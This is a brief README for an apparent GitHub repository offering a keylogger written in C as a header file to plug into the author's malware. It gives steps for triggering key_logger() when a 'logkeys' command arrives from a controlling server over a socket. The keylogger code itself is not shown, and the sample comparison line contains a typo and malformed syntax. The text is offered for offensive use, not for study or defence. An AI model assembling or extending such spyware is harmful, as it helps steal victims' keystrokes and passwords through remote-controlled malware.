# keylogger-in-c

This is a keylogger written in C.
This keylogger.h file provides you and option to append the keylogger activity in your malware.(For malware you can check my repos)

```steps to include```

1.#include "keylogger.h" in your malware.c

2.Compare the buffer data from server and write on the client socket and if (srtcmp(buffer,'logkeys'))==0 call the key_logger() .

3.key_logger() is the function in header file, if you want you can make small changes depending on your malware.
